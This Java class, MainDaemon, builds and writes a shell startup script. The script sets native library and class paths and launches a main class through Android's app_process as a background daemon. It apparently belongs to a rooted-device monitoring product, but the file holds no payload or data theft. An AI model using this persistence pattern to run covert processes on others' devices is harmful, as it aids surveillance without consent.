package com.fx.maind.ref;

import com.fx.daemon.Daemon;
import com.vvt.logger.FxLog;

public class MainDaemon extends Daemon {
	
	private static final String TAG = "MainDaemon";
	
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	
	@Override
	protected void createStartupScript() throws Exception {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:<native lib path>
		script.append(String.format(FORMAT_LIBRARY, MainDaemonResource.NATIVE_LIBS_PATH));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				MainDaemonResource.EXTRACTING_PATH, 
				MainDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, MainDaemonResource.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		createStartupScriptFile(MainDaemonResource.STARTUP_SCRIPT_PATH, result);
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
	}
	
	@Override
	protected String getExtractingResourcePath() {
		return MainDaemonResource.EXTRACTING_PATH;
	}

	@Override
	protected String getNativeLibraryPath() {
		return MainDaemonResource.NATIVE_LIBS_PATH;
	}

	@Override
	protected String[] getNativeLibraryFilenames() {
		return MainDaemonResource.NATIVE_LIB_FILENAMES;
	}
	
	@Override
	protected String[] getResourceFilenames() {
		return MainDaemonResource.RESOURCE_FILENAMES;
	}
	
	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	public String getProcessName() {
		return MainDaemonResource.PROCESS_NAME;
	}

	@Override
	public String getStartupScriptPath() {
		return MainDaemonResource.STARTUP_SCRIPT_PATH;
	}
	
}
